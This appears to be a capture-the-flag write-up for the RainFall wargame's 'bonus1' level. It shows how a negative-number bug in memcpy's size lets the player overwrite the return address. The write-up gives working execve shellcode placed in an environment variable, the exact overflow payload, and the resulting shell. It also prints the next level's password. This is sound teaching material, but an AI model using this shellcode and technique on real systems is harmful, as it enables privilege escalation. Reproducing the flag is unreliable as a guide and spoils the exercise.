@@ -1,0 +1,122 @@
+When we change to bonus1 user, we're greeted with:
+
+```shell
+RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
+No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   /home/user/bonus1/bonus1
+```
+
+We find another SUID executable, this time owned by bonus2.
+
+```shell
+bonus1@RainFall:~$ ls -l
+total 8
+-rwsr-s---+ 1 bonus2 users 5566 Mar  6  2016 bonus1
+```
+
+When executing, it segfault. And with arguments, it exists
+
+```shell
+bonus1@RainFall:~$ ./bonus1 
+Segmentation fault (core dumped)
+bonus1@RainFall:~$ ./bonus1 AAAA
+```
+
+Copying it over and decompiling.
+
+```shell
+┌──(kali㉿kali)-[~]
+└─$ scp -P 4242 bonus1@192.168.184.128:/home/user/bonus1/bonus1 .
+          _____       _       ______    _ _
+         |  __ \     (_)     |  ____|  | | |
+         | |__) |__ _ _ _ __ | |__ __ _| | |
+         |  _  /  _` | | '_ \|  __/ _` | | |
+         | | \ \ (_| | | | | | | | (_| | | |
+         |_|  \_\__,_|_|_| |_|_|  \__,_|_|_|
+
+                 Good luck & Have fun
+
+  To start, ssh with level0/level0 on 192.168.184.128:4242
+bonus1@192.168.184.128's password:
+bonus1                                                                                                                                100% 5366   892.7KB/s   00:00
+```
+
+The decompiled code looks like this
+
+```c
+undefined4 main(undefined4 placeholder_0, char **envp, int32_t arg_ch)
+{
+    undefined4 uVar1;
+    void *s2;
+    size_t n;
+    void *s1;
+    int32_t iStack_14;
+    unsigned long var_8h;
+    
+    iStack_14 = atoi(envp[1]);
+    if (iStack_14 < 10) {
+        memcpy(&n, envp[2], iStack_14 * 4);
+        if (iStack_14 == 0x574f4c46) {
+            execl("/bin/sh", data.08048580, 0);
+        }
+        uVar1 = 0;
+    } else {
+        uVar1 = 1;
+    }
+    return uVar1;
+}
+```
+
+From the source, the program take the first argument as number and if it's less than 10, it will memcpy from the second argument to `n` with size of first argument times 4.
+
+But the program doesn't protect against negative value. So after playing around with big negative number, we were able to control the size of how much we want to copy. And if the size is big enough, it will segfault, meaning we overwritten the EIP. We use the pattern generator to see where our offset is and found out that it is at 56. So with the number `-2147483633`, memcpy will copy over with 60 size, and the offset is at 56, so we need to find out what to overwrite EIP with.
+
+Similar to the last exercise, we also going to put our shellcode in the environment and overwrite the EIP to that location
+```shell
+bonus1@RainFall:~$ export A=$(python -c "print '\x31\xc0\x99\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80'")
+bonus1@RainFall:~$ env
+A=1��Ph//shh/bin��PS��
+[...]
+```
+
+We find out where our shellcode is on the stack
+
+```c
+#include <stdio.h>
+
+int main(int argc, char *argv[])
+{
+  int j;
+  printf("Argument vector:\n");
+  for (j = 0; ; j++) {
+    if (argv[j] == NULL) break;
+    printf("%2d: %p %s\n", j, argv[j], argv[j]);
+  }
+  printf("Environment vector:\n");
+  for (j++; ; j++) {
+    if (argv[j] == NULL) break;
+    printf("%2d: %p %s\n", j, argv[j], argv[j]);
+  }
+  return 0;
+}
+```
+
+We can compile and run it in /tmp.
+
+```shell
+bonus1@RainFall:/tmp$ gcc env_addr.c
+bonus1@RainFall:/tmp$ ./a.out
+[...]
+Environment vector:
+ 2: 0xbffffe22 A=1��Ph//shh/bin��PS��
+[...]
+```
+
+With this we can build our payload and run it
+
+```shell
+bonus1@RainFall:~$ ./bonus1 -2147483633 $(python -c "print 'A'*56 + '\x24\xfe\xff\xbf'")                                                           
+$ whoami
+bonus2
+$ cat /home/user/bonus2/.pass
+579bd19263eb8655e4cf7b742d75edf8c38226925d78db8163506f5191825245
+```
